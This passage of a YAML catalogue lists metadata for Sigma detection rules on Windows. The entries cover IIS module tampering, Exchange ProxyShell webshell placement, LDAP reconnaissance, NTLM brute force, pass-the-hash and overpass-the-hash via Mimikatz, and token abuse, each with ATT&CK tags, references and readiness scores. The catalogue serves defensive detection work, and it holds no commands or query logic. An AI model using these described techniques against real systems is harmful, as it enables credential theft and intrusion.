- detection_id: e8ebd53a-30c2-45bd-81bb-74befba07bdb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/iis-configuration/win_iis_logging_http_disabled.yml
  name: HTTP Logging Disabled On IIS Server
  description: Detects changes to of the IIS server configuration in order to disable
    HTTP logging for successful requests.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: iis-configuration
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.004
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1562.002
  - attack.t1505.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis
  - https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/
  - https://learn.microsoft.com/en-us/iis/configuration/system.webserver/httplogging
  false_positives:
  - Unknown
  notes: ''
- detection_id: dd857d3e-0c6e-457b-9b48-e82ae7f86bd7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/iis-configuration/win_iis_module_added.yml
  name: New Module Module Added To IIS Server
  description: Detects the addition of a new module to an IIS server.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: iis-configuration
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.004
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1562.002
  - attack.t1505.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis
  - https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/
  - https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/
  - https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview
  false_positives:
  - Legitimate administrator activity
  notes: ''
- detection_id: 9e1a1fdf-ee58-40ce-8e15-b66ca5a80e1f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/iis-configuration/win_iis_module_removed.yml
  name: Previously Installed IIS Module Was Removed
  description: Detects the removal of a previously installed IIS module.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: iis-configuration
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.004
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1562.002
  - attack.t1505.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis
  - https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/
  - https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/
  - https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview
  false_positives:
  - Legitimate administrator activity
  notes: ''
- detection_id: 31d68132-4038-47c7-8f8e-635a39a7c174
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/ldap/win_ldap_recon.yml
  name: Potential Active Directory Reconnaissance/Enumeration Via LDAP
  description: Detects potential Active Directory enumeration via LDAP
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: ldap
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.002
  - T1087.002
  - T1482
  tags:
  - attack.discovery
  - attack.t1069.002
  - attack.t1087.002
  - attack.t1482
  time_window: ''
  references:
  - https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726
  - https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/Recon/PowerView.ps1
  - https://github.com/BloodHoundAD/SharpHound3/blob/7d96b991b1887ff50349ce59c80980bc0d95c86a/SharpHound3/LdapBuilder.cs
  - https://medium.com/falconforce/falconfriday-detecting-active-directory-data-collection-0xff21-c22d1a57494c
  - https://github.com/fox-it/BloodHound.py/blob/d65eb614831cd30f26028ccb072f5e77ca287e0b/bloodhound/ad/domain.py#L427
  - https://ipurple.team/2024/07/15/sharphound-detection/
  false_positives: []
  notes: ''
- detection_id: 7ac407cc-0f48-4328-aede-de1d2e6fef41
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/lsa_server/win_lsa_server_normal_user_admin.yml
  name: Standard User In High Privileged Group
  description: Detect standard users login that are part of high privileged groups
    such as the Administrator group
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: lsa-server
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers
  - https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection
  - https://github.com/nasbench/EVTX-ETW-Resources/blob/7a806a148b3d9d381193d4a80356016e6e8b1ee8/ETWProvidersManifests/Windows11/22H2/W11_22H2_Pro_20221220_22621.963/WEPExplorer/LsaSrv.xml
  false_positives:
  - Standard domain users who are part of the administrator group. These users shouldn't
    have these right. But in the case where it's necessary. They should be filtered
    out using the "TargetUserName" field
  notes: ''
- detection_id: 550d3350-bb8a-4ff3-9533-2ba533f4a1c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/msexchange/win_exchange_proxylogon_oabvirtualdir.yml
  name: ProxyLogon MSExchange OabVirtualDirectory
  description: Detects specific patterns found after a successful ProxyLogon exploitation
    in relation to a Commandlet invocation of Set-OabVirtualDirectory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: msexchange-management
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.t1587.001
  - attack.resource-development
  time_window: ''
  references:
  - https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b7bc7038-638b-4ffd-880c-292c692209ef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/msexchange/win_exchange_proxyshell_certificate_generation.yml
  name: Certificate Request Export to Exchange Webserver
  description: Detects a write of an Exchange CSR to an untypical directory or with
    aspx name suffix which can be used to place a webshell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: windows
  product: msexchange-management
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://twitter.com/GossiTheDog/status/1429175908905127938
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 516376b4-05cd-4122-bae0-ad7641c38d48
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/msexchange/win_exchange_proxyshell_mailbox_export.yml
  name: Mailbox Export to Exchange Webserver
  description: Detects a successful export of an Exchange mailbox to untypical directory
    or with aspx name suffix which can be used to place a webshell or the needed role
    assignment for it
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: windows
  product: msexchange-management
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 09570ae5-889e-43ea-aac0-0e1221fb3d95
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/msexchange/win_exchange_proxyshell_remove_mailbox_export.yml
  name: Remove Exported Mailbox from Exchange Webserver
  description: Detects removal of an exported Exchange mailbox which could be to cover
    tracks from ProxyShell exploit
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: msexchange-management
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - https://github.com/rapid7/metasploit-framework/blob/1416b5776d963f21b7b5b45d19f3e961201e0aed/modules/exploits/windows/http/exchange_proxyshell_rce.rb#L430
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9db37458-4df2-46a5-95ab-307e7f29e675
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/msexchange/win_exchange_set_oabvirtualdirectory_externalurl.yml
  name: Exchange Set OabVirtualDirectory ExternalUrl Property
  description: Rule to detect an adversary setting OabVirtualDirectory External URL
    property to a script in Exchange Management log
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: msexchange-management
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://twitter.com/OTR_Community/status/1371053369071132675
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4fe151c2-ecf9-4fae-95ae-b88ec9c2fca6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/msexchange/win_exchange_transportagent.yml
  name: MSExchange Transport Agent Installation - Builtin
  description: Detects the Installation of a Exchange Transport Agent
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: msexchange-management
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.002
  tags:
  - attack.persistence
  - attack.t1505.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=7
  false_positives:
  - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator
    for this.
  notes: ''
- detection_id: c7d16cae-aaf3-42e5-9c1c-fb8553faa6fa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/msexchange/win_exchange_transportagent_failed.yml
  name: Failed MSExchange Transport Agent Installation
  description: Detects a failed installation of a Exchange Transport Agent
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: msexchange-management
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.002
  tags:
  - attack.persistence
  - attack.t1505.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=8
  false_positives:
  - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator
    for this.
  notes: ''
- detection_id: 98c3bcf1-56f2-49dc-9d8d-c66cf190238b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/ntlm/win_susp_ntlm_auth.yml
  name: NTLM Logon
  description: Detects logons using NTLM, which could be caused by a legacy source
    or attackers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: ntlm
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1550.002
  tags:
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.t1550.002
  time_window: ''
  references:
  - https://twitter.com/JohnLaTwC/status/1004895028995477505
  false_positives:
  - Legacy hosts
  notes: ''
- detection_id: 9c8acf1a-cbf9-4db6-b63c-74baabe03e59
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/ntlm/win_susp_ntlm_brute_force.yml
  name: NTLM Brute Force
  description: Detects common NTLM brute force device names
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: medium
  status: test
  platform: windows
  product: ntlm
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1110
  tags:
  - attack.credential-access
  - attack.t1110
  time_window: ''
  references:
  - https://www.varonis.com/blog/investigate-ntlm-brute-force
  false_positives:
  - Systems with names equal to the spoofed ones used by the brute force tools
  notes: ''
- detection_id: ce5678bb-b9aa-4fb5-be4b-e57f686256ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/ntlm/win_susp_ntlm_rdp.yml
  name: Potential Remote Desktop Connection to Non-Domain Host
  description: Detects logons using NTLM to hosts that are potentially not part of
    the domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: ntlm
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - n/a
  false_positives:
  - Host connections to valid domains, exclude these.
  - Host connections not using host FQDN.
  - Host connections to external legitimate domains.
  notes: ''
- detection_id: 3ce8e9a4-bc61-4c9b-8e69-d7e2492a8781
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/openssh/win_sshd_openssh_server_listening_on_socket.yml
  name: OpenSSH Server Listening On Socket
  description: Detects scenarios where an attacker enables the OpenSSH server and
    server starts to listening on SSH socket.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: openssh
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.004
  tags:
  - attack.lateral-movement
  - attack.t1021.004
  time_window: ''
  references:
  - https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0008-Lateral%20Movement/T1021.004-Remote%20Service%20SSH
  - https://winaero.com/enable-openssh-server-windows-10/
  - https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse
  - https://virtualizationreview.com/articles/2020/05/21/ssh-server-on-windows-10.aspx
  - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16
  false_positives:
  - Legitimate administrator activity
  notes: ''
- detection_id: 02f7c9c1-1ae8-4c6a-8add-04693807f92f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_access_token_abuse.yml
  name: Potential Access Token Abuse
  description: Detects potential token impersonation and theft. Example, when using
    "DuplicateToken(Ex)" and "ImpersonateLoggedOnUser" with the "LOGON32_LOGON_NEW_CREDENTIALS
    flag".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1134.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1134.001
  - stp.4u
  time_window: ''
  references:
  - https://www.elastic.co/fr/blog/how-attackers-abuse-access-token-manipulation
  - https://www.manageengine.com/log-management/cyber-security/access-token-manipulation.html
  false_positives:
  - Anti-Virus
  notes: ''
- detection_id: 0f63e1ef-1eb9-4226-9d54-8927ca08520a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_admin_rdp_login.yml
  name: Admin User Remote Logon
  description: Detect remote login by Administrator user (depending on internal pattern).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.001
  - T1078.002
  - T1078.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.initial-access
  - attack.t1078.001
  - attack.t1078.002
  - attack.t1078.003
  - car.2016-04-005
  time_window: ''
  references:
  - https://car.mitre.org/wiki/CAR-2016-04-005
  false_positives:
  - Legitimate administrative activity.
  notes: ''
- detection_id: 2111118f-7e46-4fc8-974a-59fd8ec95196
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_diagtrack_eop_default_login_username.yml
  name: DiagTrackEoP Default Login Username
  description: Detects the default "UserName" used by the DiagTrackEoP POC
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://github.com/Wh04m1001/DiagTrackEoP/blob/3a2fc99c9700623eb7dc7d4b5f314fd9ce5ef51f/main.cpp#L46
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c43c26be-2e87-46c7-8661-284588c5a53e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_member_added_security_enabled_global_group.yml
  name: A Member Was Added to a Security-Enabled Global Group
  description: Detects activity when a member is added to a security-enabled global
    group
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://www.cisecurity.org/controls/cis-controls-list/
  - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf
  - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=632
  false_positives:
  - Unknown
  notes: ''
- detection_id: 02c39d30-02b5-45d2-b435-8aebfe5a8629
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_member_removed_security_enabled_global_group.yml
  name: A Member Was Removed From a Security-Enabled Global Group
  description: Detects activity when a member is removed from a security-enabled global
    group
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://www.cisecurity.org/controls/cis-controls-list/
  - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf
  - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4729
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=633
  false_positives:
  - Unknown
  notes: ''
- detection_id: 192a0330-c20b-4356-90b6-7b7049ae0b87
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_overpass_the_hash.yml
  name: Successful Overpass the Hash Attempt
  description: Detects successful logon with logon type 9 (NewCredentials) which matches
    the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1550.002
  tags:
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.s0002
  - attack.t1550.002
  time_window: ''
  references:
  - https://web.archive.org/web/20220419045003/https://cyberwardog.blogspot.com/2017/04/chronicles-of-threat-hunter-hunting-for.html
  false_positives:
  - Runas command-line tool using /netonly parameter
  notes: ''
- detection_id: 8eef149c-bd26-49f2-9e5a-9b00e3af499b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_pass_the_hash_2.yml
  name: Pass the Hash Activity 2
  description: Detects the attack technique pass the hash which is used to move laterally
    inside the network
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1550.002
  tags:
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.t1550.002
  time_window: ''
  references:
  - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events
  - https://web.archive.org/web/20170909091934/https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis
  - https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/
  false_positives:
  - Administrator activity
  notes: ''
- detection_id: 51e33403-2a37-4d66-a574-1fda1782cc31
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_rdp_localhost_login.yml
  name: RDP Login from Localhost
  description: RDP login with localhost source address may be a tunnelled login
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  tags:
  - attack.lateral-movement
  - car.2013-07-002
  - attack.t1021.001
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: b237c54b-0f15-4612-a819-44b735e0de27
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_security_enabled_global_group_deleted.yml
  name: A Security-Enabled Global Group Was Deleted
  description: Detects activity when a security-enabled global group is deleted
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://www.cisecurity.org/controls/cis-controls-list/
  - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf
  - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4730
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=634
  false_positives:
  - Unknown
  notes: ''
- detection_id: 259a9cdf-c4dd-4fa2-b243-2269e5ab18a2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_successful_external_remote_rdp_login.yml
  name: External Remote RDP Logon from Public IP
  description: Detects successful logon from public IP address via RDP. This can indicate
    a publicly-exposed RDP port.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1110
  - T1133
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1133
  - attack.t1078
  - attack.t1110
  time_window: ''
  references:
  - https://www.inversecos.com/2020/04/successful-4624-anonymous-logons-to.html
  - https://twitter.com/Purp1eW0lf/status/1616144561965002752
  false_positives:
  - Legitimate or intentional inbound connections from public IP addresses on the
    RDP port.
  notes: ''
- detection_id: 78d5cab4-557e-454f-9fb9-a222bd0d5edc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_successful_external_remote_smb_login.yml
  name: External Remote SMB Logon from Public IP
  description: Detects successful logon from public IP address via SMB. This can indicate
    a publicly-exposed SMB port.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1110
  - T1133
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1133
  - attack.t1078
  - attack.t1110
  time_window: ''
  references:
  - https://www.inversecos.com/2020/04/successful-4624-anonymous-logons-to.html
  - https://twitter.com/Purp1eW0lf/status/1616144561965002752
  false_positives:
  - Legitimate or intentional inbound connections from public IP addresses on the
    SMB port.
  notes: ''
- detection_id: f88e112a-21aa-44bd-9b01-6ee2a2bbbed1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_susp_failed_logon_source.yml
  name: Failed Logon From Public IP
  description: Detects a failed logon attempt from a public IP. A login from a public
    IP can indicate a misconfigured firewall or network boundary.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1133
  - T1190
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.initial-access
  - attack.persistence
  - attack.t1078
  - attack.t1190
  - attack.t1133
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625
  false_positives:
  - Legitimate logon attempts over the internet
  - IPv4-to-IPv6 mapped IPs
  notes: ''
- detection_id: def8b624-e08f-4ae1-8612-1ba21190da6b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_susp_logon_newcredentials.yml
  name: Outgoing Logon with New Credentials
  description: Detects logon events that specify new credentials
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1550
  tags:
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.t1550
  time_window: ''
  references:
  - https://go.recordedfuture.com/hubfs/reports/mtp-2021-0914.pdf
  false_positives:
  - Legitimate remote administration activity
  notes: ''
- detection_id: 749c9f5e-b353-4b90-a9c1-05243357ca4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_susp_privesc_kerberos_relay_over_ldap.yml
  name: Potential Privilege Escalation via Local Kerberos Relay over LDAP
  description: 'Detects a suspicious local successful logon event where the Logon
    Package is Kerberos, the remote address is set to localhost, and the target user
    SID is the built-in local Administrator account.

    This may indicate an attempt to leverage a Kerberos relay attack variant that
    can be used to elevate privilege locally from a domain joined limited user to
    local System privileges.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - multi_signal_correlation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.credential-access
  - attack.t1548
  time_window: ''
  references:
  - https://twitter.com/sbousseaden/status/1518976397364056071?s=12&t=qKO5eKHvWhAP19a50FTZ7g
  - https://github.com/elastic/detection-rules/blob/5fe7833312031a4787e07893e27e4ea7a7665745/rules/_deprecated/privilege_escalation_krbrelayup_suspicious_logon.toml#L38
  false_positives:
  - Unknown
  notes: ''
- detection_id: 16f5d8ca-44bd-47c8-acbe-6fc95a16c12f
  source_id: sigmahq_sigma
